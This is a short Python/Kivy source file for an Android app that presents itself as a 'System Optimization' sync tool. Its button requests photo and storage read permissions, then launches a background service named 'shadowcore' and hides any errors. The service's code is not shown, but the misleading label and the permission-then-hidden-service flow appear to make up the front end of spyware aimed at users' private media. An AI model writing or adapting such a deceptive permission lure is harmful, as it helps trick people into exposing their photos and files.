from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
from jnius import autoclass

class ShadowApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
        self.label = Label(text="System Optimization\nReady to Sync", halign='center', font_size='20sp')
        self.btn = Button(text="START SYNC", background_color=(0, 0.5, 0.8, 1), font_size='22sp', bold=True)
        self.btn.bind(on_press=self.start)
        self.layout.add_widget(self.label)
        self.layout.add_widget(self.btn)
        return self.layout

    def start(self, instance):
        perms = [Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE, Permission.FOREGROUND_SERVICE]
        request_permissions(perms, self.launch)

    def launch(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.btn.text = "SYNC ACTIVE"
            self.btn.disabled = True
        except: pass

if __name__ == "__main__":
    ShadowApp().run()
